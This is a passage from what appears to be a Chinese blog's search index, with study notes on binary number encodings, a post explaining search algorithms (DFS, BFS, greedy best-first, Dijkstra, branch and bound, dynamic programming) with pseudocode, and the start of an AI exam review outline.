（从补码还原到原码同样适用）</strong></li><li>只有一个0，比原码多表示一位负数</li></ul><p>$$<br>[x]_补 =<br>\begin{cases}<br>0,x &amp; 2^n &gt; x \geq 0 \<br>2^{n + 1} + x &amp; 0 &gt; x \geq -2^n<br>\end{cases}<br>$$</p><p>$$<br>[x]_补 =<br>\begin{cases}<br>x &amp; 1 &gt; x \geq 0 \<br>2 + x &amp; 0 &gt; x \geq -1 (mod \space2)<br>\end{cases}<br>$$</p><ul><li><p>当模数为4，即 $(mod \space 2^2)$ 时，形成双符号位</p><p>这种双符号位补码又称变形码，再阶码的运算和溢出判断中有特殊作用</p></li></ul><h4 id="1-4-反码">1.4 反码</h4><ul><li>通常是原码和补码的过度</li><li>有两个0，不同表示的+0，-0</li><li><strong>除符号位按位取反</strong></li></ul><p>$$<br>[x]_反 =<br>\begin{cases}<br>0,x &amp; 2^n &gt; x \geq 0 \<br>(2^{n + 1} - 1) + x &amp; 0 \geq x &gt; -2^n &amp; (mod(2^{n+1}-1))<br>\end{cases}<br>$$</p><p>$$<br>[x]_反 =<br>\begin{cases}<br>x &amp; 1 &gt; x \geq 0 \<br>(2 - 2^{n-1}) + x &amp; 0 \geq x &gt; -1 &amp; (mod \space (2 - 2^{n-1})<br>\end{cases}<br>$$</p><h4 id="1-5-移码">1.5 移码</h4><ul><li>补码没法直接比较大小，移码比较大小很方便</li><li>0 是唯一的</li><li>**对每个真值 $+2^n$ **</li></ul><p>$$<br>[x]_移 = 2^n + x \space (2^n &gt; x \geq -2^n)<br>$$</p><p><font color="red">同一个真值的移码和补码仅差一个符号位</font></p><h2 id="二、数的定点表示和浮点表示">二、数的定点表示和浮点表示</h2><h2 id="markdown语法参考">markdown语法参考</h2><ul><li>方程组</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;cases&#125;</span><br><span class="line">3x + 5y +  z \\</span><br><span class="line">7x - 2y + 4z \\</span><br><span class="line">-6x + 3y + 2z</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>$$<br>\begin{cases}<br>3x + 5y +  z \<br>7x - 2y + 4z \<br>-6x + 3y + 2z<br>\end{cases}<br>$$</p><ul><li>大于等于</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\geq</span><br></pre></td></tr></table></figure><p>$$<br>\geq<br>$$</p><ul><li>小于等于</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\leq</span><br></pre></td></tr></table></figure><p>$$<br>\leq<br>$$</p><ul><li>约等于</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\approx</span><br></pre></td></tr></table></figure><p>$$<br>\approx<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索算法</title>
      <link href="/p/401ea1e.html"/>
      <url>/p/401ea1e.html</url>
      
        <content type="html"><![CDATA[<h1>搜索算法</h1><blockquote><p>被可爱的女孩子问懵了，学艺不精，翻车的我决定重新理解一下这几个算法</p><p><font color="purple">wiki真是个好东西，它真的我哭死</font></p></blockquote><h2 id="1-深度优先搜索（Depth-First-Search-DFS）">1. 深度优先搜索（Depth-First-Search, DFS）</h2><blockquote><p>不多说，遍历顺序如下图序号</p></blockquote> <img src="/p/401ea1e/300px-Depth-first-tree.svg.png" class title="节点搜索的顺序"><h2 id="2-广度优先搜索（Breadth-first-search-BFS）">2. 广度优先搜索（Breadth-first search, BFS）</h2><blockquote><p>也不多说，遍历顺序在图中</p></blockquote> <img src="/p/401ea1e/300px-Breadth-first-tree.svg.png" class title="Order in which the nodes get expanded"><h2 id="3-启发式搜索策略">3. 启发式搜索策略</h2><h3 id="3-1-爬山法（Hill-climbing）">3.1 爬山法（Hill climbing）</h3><p>爬山法是完完全全的贪心法，每次都鼠目寸光的选择一个当前最优解，因此只能搜索到局部的最优值。</p><p><strong>例题：</strong> 以八数码为例</p> <img src="/p/401ea1e/image-20221118112147486.png" class title="image-20221118112147486"> <img src="/p/401ea1e/image-20221118112208202.png" class title="image-20221118112208202"><p>每一步都选择局部最优，最后很可能陷入一个局部最优解。</p> <img src="/p/401ea1e/image-20221118112307985.png" class title="image-20221118112307985"><p>那么能不能优化一下呢？当它找到某个山顶时，可以给个随机数，随机一下，就有概率找到更优的解（同时也承担着找到更差解的风险）。下面以模拟退火为例，</p><p>模拟退火其实也是一种贪心算法，但是它的搜索过程引入了随机因素.。模拟退火算法以一定的概率来接受一个比当前解要差的解，因此有可能会跳出这个局部的最优解，达到全局的最优解。以上图为例，模拟退火算法在搜索到局部最优解A后，会以一定的概率接受到E的移动。也许经过几次这样的不是局部最优的移动后会到达D点，于是就跳出了局部最大值A。</p><h3 id="3-2-最佳优先搜索（Best-first-search）">3.2 最佳优先搜索（Best-first search）</h3><p>首先看一下wikipedia对 <code>Best-first search</code> 算法的解释</p> <img src="/p/401ea1e/image-20221118003835733.png" class title="image-20221118003835733"><p>说法不是很统一，大概是两种</p><ol><li><p>可以是 <code>A*</code> 这样的启发式函数，既用到了从起点到当前点的评价，也用到了从当前点到目标点的估价。</p></li><li><p>可以是 <code>greedy best-first search</code> 基于贪心策略的优先搜索，即只用到从当前点到达目标点的估价。</p></li></ol><p>这里我选择第二种来理解，<code>wiki</code> 给出的伪代码如下，看算法名字就很形象，贪心的 <code>BFS</code></p><h2 id="Greedy-BFS">Greedy BFS</h2><p>Using a greedy algorithm, expand the first successor of the parent. After a successor is generated:</p><p>使用贪心算法，将队列中的所有结点排序后，将队列中位于队首的结点出队，将其所有子节点拓展进队列</p><ol><li><p>If the successor’s heuristic is better than its parent, the successor is set at the front of the queue (with the parent reinserted directly behind it), and the loop restarts.</p><p>如果后代节点的估价更优，则可以放在父节点的前面。（实现过程可以是用普通队列让所有节点出队，重新排序后入队；也可以使用优先队列（堆），这样每次优先队列的队首（堆顶）都是当前队列中估价最优的节点）</p></li><li><p>Else, the successor is inserted into the queue (in a location determined by its heuristic value). The procedure will evaluate the remaining successors (if any) of the parent.</p><p>如果新加入的节点估价不好，按照估价排序放在队列中的对应位置就行</p></li></ol><p>Below is a pseudocode example of this algorithm, where <strong>queue</strong> represents a priority queue which orders nodes based on their heuristic distances from the goal. This implementation keeps track of visited nodes, and can therefore be used for undirected graphs. It can be modified to retrieve the path.</p><p>下面是该算法的伪代码示例，其中 queue 表示优先级队列，它根据节点与目标的启发式距离对节点进行排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">procedure GBS(start, target) <span class="keyword">is</span>:</span><br><span class="line">  mark start <span class="keyword">as</span> visited</span><br><span class="line">  add start to queue</span><br><span class="line">  <span class="keyword">while</span> queue <span class="keyword">is</span> <span class="keyword">not</span> empty do:</span><br><span class="line">    current_node ← vertex of queue <span class="keyword">with</span> <span class="built_in">min</span> distance to target</span><br><span class="line">    remove current_node <span class="keyword">from</span> queue</span><br><span class="line">    foreach neighbor n of current_node do:</span><br><span class="line">      <span class="keyword">if</span> n <span class="keyword">not</span> <span class="keyword">in</span> visited then:</span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">is</span> target:</span><br><span class="line">          <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          mark n <span class="keyword">as</span> visited</span><br><span class="line">          add n to queue</span><br><span class="line">  <span class="keyword">return</span> failure </span><br></pre></td></tr></table></figure><p>可以看到，每个节点都会被 <code>visited</code> 标记，即每个节点只能访问一次，每次都是<strong>贪心</strong>的选择下一步的最优解，不回头更新之前的搜索过的结果，可能会陷入局部最优。</p><p><strong>例题：</strong> 以八数码为例，使用优先队列（小顶堆）</p> <img src="/p/401ea1e/image-20221118110530036.png" class title="image-20221118110530036"><p>贪心的选择队列中的元素做搜索</p><ul><li>开始根节点入队，与目标情况差距为3，即1，2，8不在正确的位置上</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[3(一层一号)]</span><br></pre></td></tr></table></figure><ul><li>根节点出队，将其子节点放入优先队列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[3(二层一号), 3(二层二号), 4(二层三号), 4(二层四号)]</span><br></pre></td></tr></table></figure><ul><li>取出 <code>3(二层一号)</code> ，将其子节点放入优先队列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[3(二层二号), 3(三层层二号), 4(二层三号), 4(二层四号), 4(三层一号)]</span><br></pre></td></tr></table></figure><ul><li>取出 <code>3(二层二号)</code> ，将其子节点放入优先队列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2(三层三号), 3(三层层二号), 4(二层三号), 4(二层四号), 4(三层一号), 4(三层四号)]</span><br></pre></td></tr></table></figure><ul><li>取出 <code>2(三层三号)</code>, 将其子节点放入优先队列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1(四层一号), 3(三层层二号), 4(二层三号), 4(二层四号), 4(三层一号), 4(三层四号)]</span><br></pre></td></tr></table></figure><ul><li>取出 <code>1(四层一号)</code>, 在其子节点中找到目标节点， <code>0(五层一号)</code>，找到可行解，搜索停止</li></ul><p>可以看到 <code>Best-first search</code> 并没有剪枝操作，只是贪心的选择搜索的下一个节点，找到的可能是局部最优解。</p><h2 id="4-代价一致搜索（Dijkstra）">4. 代价一致搜索（Dijkstra）</h2><p>代价一致搜索其实就是 <code>Dijkstra</code> 其搜索过程如下图所示</p> <img src="/p/401ea1e/220px-Dijkstra_Animation.gif" class title="Dijkstra Animation.gif"><p>与 <code>Best-first search</code> 不一样的地方:</p><ul><li>这里寻找点，用到的是从<strong>起点</strong>到<strong>当前点</strong>的距离</li><li>这里<strong>不</strong>限制每个节点的访问次数，找到一个更优的解，就可以去更新所有已经搜索过的路径长度，最后获得全局最优解。</li></ul><p><strong>伪代码（Pseudocode）如下</strong></p><p><code>dist[u]</code> 是从源点到顶点 u 的当前距离。</p><p><code>Graph.Edges(u, v)</code> 返回连接两个邻居节点 u 和 v 的边的长度（即之间的距离）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>  function Dijkstra(Graph, source):</span><br><span class="line"> <span class="number">2</span>      </span><br><span class="line"> <span class="number">3</span>      <span class="keyword">for</span> each vertex v <span class="keyword">in</span> Graph.Vertices:</span><br><span class="line"> <span class="number">4</span>          dist[v] ← INFINITY</span><br><span class="line"> <span class="number">5</span>          prev[v] ← UNDEFINED</span><br><span class="line"> <span class="number">6</span>          add v to Q</span><br><span class="line"> <span class="number">7</span>      dist[source] ← <span class="number">0</span></span><br><span class="line"> <span class="number">8</span>      </span><br><span class="line"> <span class="number">9</span>      <span class="keyword">while</span> Q <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line"><span class="number">10</span>          u ← vertex <span class="keyword">in</span> Q <span class="keyword">with</span> <span class="built_in">min</span> dist[u]</span><br><span class="line"><span class="number">11</span>          remove u <span class="keyword">from</span> Q</span><br><span class="line"><span class="number">12</span>          </span><br><span class="line"><span class="number">13</span>          <span class="keyword">for</span> each neighbor v of u still <span class="keyword">in</span> Q:</span><br><span class="line"><span class="number">14</span>              alt ← dist[u] + Graph.Edges(u, v)</span><br><span class="line"><span class="number">15</span>              <span class="keyword">if</span> alt &lt; dist[v]:</span><br><span class="line"><span class="number">16</span>                  dist[v] ← alt</span><br><span class="line"><span class="number">17</span>                  prev[v] ← u</span><br><span class="line"><span class="number">18</span></span><br><span class="line"><span class="number">19</span>      <span class="keyword">return</span> dist[], prev[]</span><br></pre></td></tr></table></figure><p>可以看到，一个节点可以多次入队，可以反复更新之前搜索过的路径，最后获得全局最优解。</p><h2 id="5-分支限界（Branch-and-bound，简称BB）">5. 分支限界（Branch and bound，简称BB）</h2><blockquote><p>分支限界法常以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。在分支限界法中，每一个活结点（没被访问过的节点）只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止。</p></blockquote><p>首先对比一下<strong>回溯法</strong>和<strong>分支限界法</strong></p><ul><li><p>回溯法：一种基于深度优先搜索的剪枝策略</p><ul><li><p>回溯法的求解目标是找出解空间树中满足约束条件的<strong>所有解</strong></p></li><li><p>利用深度优先搜索的方法，当搜到一个显然不合理的结果时，没必要继续深入搜索，这时利用回溯回退到其父节点，寻找下一个值得继续搜索的节点。如此可以剪去一些不必要的搜索，同时可以找到所有可能的结果。</p></li></ul></li><li><p>分支限界法：常基于广度优先搜索的剪枝策略</p><ul><li>分支限界法的求解目标是找出满足约束条件的<strong>一个解</strong>，或是在满足约束条件的解中找出在某种意义下的最优解。</li><li>利用广度优先搜索，首先根据已知的条件确定到达目标节点的代价上界，并估计当前可达拓展节点的代价下界，如果可拓展节点的代价下界超出到达目标节点的代价上界时，该节点肯定不是最优解了，抛弃之，即剪枝。</li><li>实现方法可以有很多，原理差不多，一般选用优先队列，比较简单好理解<ul><li>队列式(FIFO)分支限界法：按照队列先进先出（FIFO）原则选取下一个节点为扩展节点。</li><li>LC（最小代价）分支限界法：采用优先队列作为活结点表</li><li>栈式(LIFO)分支限界法：按照栈的存储方式排序拓展节点</li></ul></li></ul></li></ul><p><strong>例题</strong>：以单源最短路为例来解释分支界限法的计算过程：求从S-&gt;T的最短距离（括号内为从起点到达当前点的路径长度）</p> <img src="/p/401ea1e/image-20221118110316892.png" class title="image-20221118110316892"><ul><li>首先根节点（出发点）进入优先队列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[S(0)]</span><br></pre></td></tr></table></figure><ul><li>根节点出队，拓展根节点，将其可达的三个子节点入队</li></ul> <img src="/p/401ea1e/image-20221118102323569.png" class title="image-20221118102323569"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[A(2), B(3), C(4)]:此时S-&gt;A的代价最小，所以优先队列队首（堆顶）是A节点</span><br></pre></td></tr></table></figure><ul><li>队首A节点出队，拓展A节点，其子节点入队</li></ul> <img src="/p/401ea1e/image-20221118104112193.png" class title="image-20221118104112193"><p>由于每个节点只能拓展一次，当出现两个<strong>相同</strong>可拓展节点时，即将出现<strong>重复</strong>的搜索，此时进行对重复搜索的剪枝，选择代价最优的拓展，这里舍弃路径较长的 <code>B(5)</code> ，即更新 <code>B</code> 节点的代价下界为 3。（当出现代价小于 3 的 <code>B</code> 节点，则更新 <code>B</code> 节点的最小下界，并替换 <code>B</code> 节点，否则丢弃新找到的节点）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[B(3), C(4), D(9), E(4)]</span><br></pre></td></tr></table></figure><ul><li>取出此时代价最小的节点 <code>B</code> 做拓展</li></ul> <img src="/p/401ea1e/image-20221118104021306.png" class title="image-20221118104021306"><p><code>E</code> 节点的下界此时为 4 ，剪枝舍弃新的节点 <code>E(12)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[C(4), D(9), E(4), F(5)]</span><br></pre></td></tr></table></figure><ul><li>取出此时代价最小的节点 <code>C</code> 做拓展</li></ul> <img src="/p/401ea1e/image-20221118104437183.png" class title="image-20221118104437183"><p><code>F</code> 节点的下界此时为 5 ，剪枝舍弃新的节点 <code>F(6)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[D(9), E(4), F(5)]</span><br></pre></td></tr></table></figure><ul><li>取出此时代价最小的节点 <code>E</code> 做拓展</li></ul> <img src="/p/401ea1e/image-20221118104737397.png" class title="image-20221118104737397"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[D(9), F(5), H(7)]</span><br></pre></td></tr></table></figure><ul><li>取出此时代价最小的节点 <code>F</code> 做拓展</li></ul> <img src="/p/401ea1e/image-20221118105013303.png" class title="image-20221118105013303"><p>更新 <code>H</code> 下界为 6，舍弃原来的 <code>H(7)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[D(9), H(6), I(6)]</span><br></pre></td></tr></table></figure><ul><li>取出此时代价最小的节点 <code>H</code> 做拓展</li></ul> <img src="/p/401ea1e/image-20221118105456775.png" class title="image-20221118105456775"><p>这里贪心的找到了第一个可行解，记录从起点到达终点的代价上界为 8 。（此时如果再出现下界小于上界的节点，则直接抛弃，这部分是舍弃不必要搜索的剪枝）</p> <img src="/p/401ea1e/image-20221118105824512.png" class title="image-20221118105824512"><p>这里把 <code>D(9)</code> 分支剪掉，因为 <code>D</code> 此时的代价下界已是 9，超过起点到达目标点的上界，不可能找到更优的解，直接舍弃该分支。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[I(6)]</span><br></pre></td></tr></table></figure><ul><li>取出此时代价最小的节点 <code>I</code> 做拓展</li></ul> <img src="/p/401ea1e/image-20221118110243588.png" class title="image-20221118110243588"><p>找到一个更优的可行解，更新起点到终点的上界为 7</p><p>此时优先队列为空，搜索结束，最短路径长为 7</p><h2 id="6-动态规划（Dynamic-programming）">6. 动态规划（Dynamic programming）</h2><p>动态规划在查找有很多<strong>重叠子问题</strong>的情况的最优解时有效。它将问题重新组合成子问题。为了避免多次解决这些子问题，它们的结果都逐渐被计算并被保存，从简单的问题直到整个问题都被解决。因此，动态规划保存递归时的结果，因而不会在解决同样的问题时花费时间。</p><p>动态规划只能应用于有<strong>最优子结构</strong>的问题。最优子结构的意思是局部最优解能决定全局最优解（对有些问题这个要求并不能完全满足，故有时需要引入一定的近似）。简单地说，问题能够分解成子问题来解决。</p><p><strong>例题1（无向图）：</strong> 以下图为例，求解 <code>S-&gt;T</code> 的最短路径</p> <img src="/p/401ea1e/image-20221118112709161.png" class title="image-20221118112709161"><p>首先考虑如何拆解问题，</p><p>从一个点到达另一个点只有两种方式：</p><ul><li>直接到达</li><li>通过其他点中转到达</li></ul><p>想知道 <code>S-&gt;T</code> 的最短距离，对于他们路径上某个点 <code>x</code> ，只需要知道 <code>S-&gt;X</code> 的最小距离和 <code>X-&gt;T</code> 的最小距离，即可推出经过点 <code>X</code> 的情况下，<code>S-&gt;T</code> 的最短距离。</p><p>邻接矩阵：<code>dp[i][j]</code> 表示 <code>i-&gt;j</code> 的路径距离</p><p>状态转移方程如下：取当前的最短路径和经过 <code>X</code> 中转之后的最短路径中的最小值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[S][T] = min(dp[S][T], dp[S][X] + dp[X][T]);</span><br></pre></td></tr></table></figure><p>根据上图可以的到的邻接矩阵如下</p><ul><li>0 表示 节点到自己距离为 0</li><li>空表示 <code>dist[i][j] = inf</code> 即 <code>i, j</code> 两点之间不可达，距离为无穷大</li><li>其余数字代表 <code>dist[i][j]</code> 即 <code>i-&gt;j</code> 的边长距离</li></ul><table><thead><tr><th>i\j</th><th>S</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>t</th></tr></thead><tbody><tr><td>S</td><td>0</td><td>3</td><td></td><td></td><td>4</td><td></td><td></td><td></td></tr><tr><td>A</td><td>3</td><td>0</td><td>4</td><td></td><td>5</td><td></td><td></td><td></td></tr><tr><td>B</td><td></td><td>4</td><td>0</td><td>4</td><td></td><td>5</td><td></td><td></td></tr><tr><td>C</td><td></td><td></td><td>4</td><td>0</td><td></td><td></td><td></td><td></td></tr><tr><td>D</td><td>4</td><td>5</td><td></td><td></td><td>0</td><td>2</td><td></td><td></td></tr><tr><td>E</td><td></td><td></td><td></td><td></td><td>2</td><td>0</td><td>4</td><td></td></tr><tr><td>F</td><td></td><td></td><td></td><td></td><td></td><td>4</td><td>0</td><td>3</td></tr><tr><td>t</td><td></td><td></td><td></td><td></td><td></td><td></td><td>3</td><td>0</td></tr></tbody></table><p>动态规划过程如下：</p><p>首先初始化所有的 <code>dp[i][j]</code> 为当前邻接矩阵中的值</p><p>从目标结论出发，逐步递推，就可将问题转化到我们已知的初始值上，即 <code>dp[S][A]</code> 和 <code>dp[S][D]</code></p><p><code>S-&gt;t</code> : <code>dp[S][t] = min(dp[S][t], dp[S][K] + dp[K][t]);</code> K 可能是剩余节点中任何一个可能到达 <code>t</code> 的节点</p><p><code>S-&gt;F</code> : <code>dp[S][F] = min(dp[S][F], dp[S][K] + dp[K][F]);</code> K 可能是剩余节点中任何一个可能到达 <code>F</code> 的节点</p><p><code>S-&gt;E</code> : <code>dp[S][E] = min(dp[S][E], dp[S][K] + dp[K][E]);</code> K 可能是剩余节点中任何一个可能到达 <code>E</code> 的节点</p><p>…</p><p><code>S-&gt;A</code> : <code>dp[S][A] = min(dp[S][A], dp[S][K] + dp[K][A]);</code> K 只能是 S ， 此时得到 <code>dp[S][A] = 3;</code></p><p><code>S-&gt;D</code> : <code>dp[S][D] = min(dp[S][D], dp[S][K] + dp[K][D]);</code> K 只能是 S ， 此时得到 <code>dp[S][D] = 4;</code></p><p>那么我们从下向上递推，就能通过逐步更新到达前面节点的最小距离，得到我们要的答案 <code>dp[S][T]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; n; t++) &#123; <span class="comment">// 按邻接表中的顺序给搜索树编号</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; t; k++) &#123;</span><br><span class="line">dp[<span class="number">0</span>][t] = min(dp[<span class="number">0</span>][t], dp[<span class="number">0</span>][k] + dp[k][t]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递推的过程可以看作从前往后建立一颗搜索树（不能抵达待更新路径终点的节点没有画出），下图的 <code>g = dp[0][i]</code></p> <img src="/p/401ea1e/image-20221118135533558.png" class title="image-20221118135533558"><p>有多条路径能够到达某个节点时，在动态规划的过程中，已经将最短路径做了更新，之后每次用到的都是当前已知路径中最短的路径，相当对那些较长的路径做了剪枝，保留最短路径而删去之前找到的较长路径，不从这些路径继续向下寻找。</p><p><strong>例题2（有向图，）：</strong> 一张来自阿里云社区的博客动图</p><blockquote><p>如果拓展表中有多条到达某一公共节点的路径时，只保留耗散值最小的路径，其余删去。</p><p>下图橙色箭头就是在拓展节点，当拓展到的节点已经有可达路径时，判断新的路径和之前的路径哪个耗散值最小（即路径长度最小），保留最小长度的路径，其余路径删去，之后的拓展，基于这个最短的路径值继续拓展。</p></blockquote> <img src="/p/401ea1e/9b98a61b5f9041f3a7aafbb26a635841.gif" class title="img"><p>邻接矩阵：<code>dist[i][j]</code> 表示 <code>i-&gt;j</code> 的路径距离</p><p><code>dp[i]</code> 表示从起点到达节点 <code>i</code> 的最小距离</p><p>状态转移方程如下：取当前的最短路径和经过 <code>X</code> 中转之后的最短路径中的最小值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[T] = min(dp[T], dp[X] + dist[X][T]);</span><br></pre></td></tr></table></figure><p>动态规划核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; n; j++) &#123; <span class="comment">// 首先以第一个点作为终点，从前往后递推，不断把终点后移直到终点，其之前的节点的路径已经都算出来了，可作为动态规划的条件</span></span><br><span class="line">    <span class="keyword">for</span> (i = j - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dist[i][j] + dp[i] &lt; dp[j]) &#123;</span><br><span class="line">            dp[j] = dist[i][j] + dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[n];</span><br></pre></td></tr></table></figure><h2 id="参考文章">参考文章</h2><p>Depth-First-Search: <a href="https://en.wikipedia.org/wiki/Depth-first_search">https://en.wikipedia.org/wiki/Depth-first_search</a></p><p>Breadth-first search: <a href="https://en.wikipedia.org/wiki/Breadth-first_search">https://en.wikipedia.org/wiki/Breadth-first_search</a></p><p>Hill climbing: <a href="https://en.wikipedia.org/wiki/Hill_climbing">https://en.wikipedia.org/wiki/Hill_climbing</a></p><p>Best-first search: <a href="https://en.wikipedia.org/wiki/Best-first_search">https://en.wikipedia.org/wiki/Best-first_search</a></p><p>Dijkstra’s algorithm: <a href="https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm">https://en.wikipedia.org/wiki/Dijkstra’s_algorithm</a></p><p>Branch and bound: <a href="https://en.wikipedia.org/wiki/Branch_and_bound">https://en.wikipedia.org/wiki/Branch_and_bound</a></p><p>Dynamic programming: <a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92">https://zh.wikipedia.org/wiki/动态规划</a></p><p>七七八八百科：<a href="https://www.cxyzjd.com/article/weixin_42715356/83089108">https://www.cxyzjd.com/article/weixin_42715356/83089108</a></p><p>快懂百科：<a href="https://www.baike.com/wikiid/6434614434763778717?prd=mobile&amp;view_id=28w07z5dmyas00">https://www.baike.com/wikiid/6434614434763778717?prd=mobile&amp;view_id=28w07z5dmyas00</a></p><p>阿里云社区：<a href="https://developer.aliyun.com/article/1047074">https://developer.aliyun.com/article/1047074</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法-搜索 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能（三）</title>
      <link href="/p/96eafb50.html"/>
      <url>/p/96eafb50.html</url>
      
        <content type="html"><![CDATA[<h1>人工智能复习（三）</h1><h2 id="三、推理">三、推理</h2><h3 id="3-不确定性推理">3. 不确定性推理</h3><h4 id="3-2-font-face-华文彩云-size-5-color-red-概率推理（Byes-是重点）-font">3.2 <font face="华文彩云" size="5" color="red">概率推理（Byes 是重点）</font></h4><ul><li>概率的基础介绍<ul><li>理解随机变量</li><li>联合概率，边缘概率，条件概率的意义及计算方法</li><li>链式法则及贝叶斯法则</li></ul></li><li>贝叶斯网络的表示（重点）<ul><li>贝叶斯网络的表示方法，其中任意两个节点间相互独立性的判断方法</li></ul></li><li>贝叶斯网络的精确及近似推理（重点）<ul><li>贝叶斯网络中条件概率的计算方法（枚举法以及变元消除法）</li><li>贝叶斯网络中的采样方法（优先、拒绝、似然权重采样）</li></ul></li></ul><h2 id="四、搜索策略">四、搜索策略</h2><h3 id="1-搜索的基本概念">1. 搜索的基本概念</h3><h3 id="2-状态空间的搜索">2. 状态空间的搜索</h3><h4 id="2-1-盲目搜索">2.1 盲目搜索</h4><ul><li>广度优先</li><li>深度优先</li><li>代价一致</li></ul><h4 id="2-2-font-face-华文彩云-size-5-color-red-启发式搜索（重点）-font">2.2 <font face="华文彩云" size="5" color="red">启发式搜索（重点）</font></h4><ul><li>贪心（理解启发函数的意义）</li><li>A* （理解A* 算法的可纳性，最优性以及单调限制性及其对算法性能的影响）</li></ul><h3 id="3-博弈树搜索">3. 博弈树搜索</h3><h4 id="3-1-font-face-华文彩云-size-5-color-red-极大极小值方法（重点）-font">3.1 <font face="华文彩云" size="5" color="red">极大极小值方法（重点）</font></h4><ul><li>掌握博弈树搜索中的极大极小方法，能利用其求根节点的估价值</li></ul><h4 id="3-2-font-face-华文彩云-size-5-color-red-alpha-beta-剪枝（重点）-font">3.2<font 